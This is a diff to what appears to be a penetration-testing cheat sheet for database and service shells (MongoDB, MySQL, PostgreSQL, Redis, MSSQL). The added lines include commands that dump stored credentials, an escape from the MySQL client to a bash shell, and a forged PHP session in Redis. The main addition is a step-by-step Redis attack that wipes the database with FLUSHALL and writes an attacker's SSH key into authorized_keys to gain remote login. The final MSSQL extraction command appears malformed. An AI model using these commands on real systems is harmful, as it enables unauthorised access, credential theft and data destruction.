@@ -7,6 +7,7 @@
 #### 1) 
 
     mongo
+    mongo "mongodb://localhost:27017"
 
 #### 2) 
 
@@ -23,6 +24,19 @@
 #### 5) 
 
     db.TABLE.find() (Dump everything from table)
+
+#### More commands
+
+    > use <DATABASE>;
+    > show tables;
+    > show collections;
+    > db.system.keys.find();
+    > db.users.find();
+    > db.getUsers();
+    > db.getUsers({showCredentials: true});
+    > db.accounts.find();
+    > db.accounts.find().pretty();
+    > use admin;
 
 # MYSQL SHELL NAVIGATION
 
@@ -46,6 +60,10 @@
 
     SELECT * FROM TABLE; (Dump everything from table)
 
+#### 6) Drop a shell
+
+    \! /bin/bash
+
 ## For root authentication there is a small detail:
 
 #### 
@@ -68,11 +86,23 @@
 
 #### 3) 
 
-    \dt (Shows tables of the database)
+    \c DATABASE (Use database)
 
 #### 4) 
 
+    \dt (Shows tables of the database)
+
+#### 5)
+
+    \du (List users roles)
+
+#### 6) 
+
     select * from TABLE;
+
+#### 7)
+
+    SHOW rds.extensions; (List installed extensions)
 
 # REDIS-CLI SHELL NAVIGATION
 
@@ -83,6 +113,58 @@
 #### 2) 
 
     CONFIG GET * (Query the configuration of the redis instance)
+
+#### More commands
+
+    > AUTH <PASSWORD>
+    > AUTH <USERNAME> <PASSWORD>
+    > INFO SERVER
+    > INFO keyspace
+    > CONFIG GET *
+    > SELECT <NUMBER>
+    > KEYS *
+    > HSET // set value if a field within a hash data structure
+    > HGET // retrieves a field and his value from a hash data structure
+    > HKEYS // retrieves all field names from a hash data structure
+    > HGETALL // retrieves all fields and values from a hash data structure
+    > GET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b
+    > SET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b "username|s:8:\"<USERNAME>\";role|s:5:\"
+
+#### Enter our own SSH key to server
+
+    redis-cli -h <RHOST>
+    
+    echo "FLUSHALL" | redis-cli -h <RHOST>
+
+    (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /PATH/TO/FILE/<FILE>.txt
+
+    cat /PATH/TO/FILE/<FILE>.txt | redis-cli -h <RHOST> -x set s-key
+
+    <RHOST>:6379> get s-key
+
+    <RHOST>:6379> CONFIG GET dir
+
+    1) "dir"
+
+    2) "/var/lib/redis"
+
+    <RHOST>:6379> CONFIG SET dir /var/lib/redis/.ssh
+
+    OK
+
+    <RHOST>:6379> CONFIG SET dbfilename authorized_keys
+
+    OK
+
+    <RHOST>:6379> CONFIG GET dbfilename
+
+    1) "dbfilename"
+
+    2) "authorized_keys"
+
+    <RHOST>:6379> save
+
+    OK
 
 # KPCLI SHELL NAVIGATION (ALTERNATIVE: KEEPASS2 WHICH IS A GUI)
 
@@ -136,3 +218,15 @@
 
     select * from users;
 
+# OPENQUERY
+
+    1> select * from openquery("web\clients", 'select name from master.sys.databases');
+    2> go
+
+    1> select * from openquery("web\clients", 'select name from clients.sys.objects');
+    2> go
+
+#### Binary Extraction as Base64
+
+    1> select cast((select content from openquery([web\clients], 'select * from clients.sys.objects');
+    2> go > export.txt
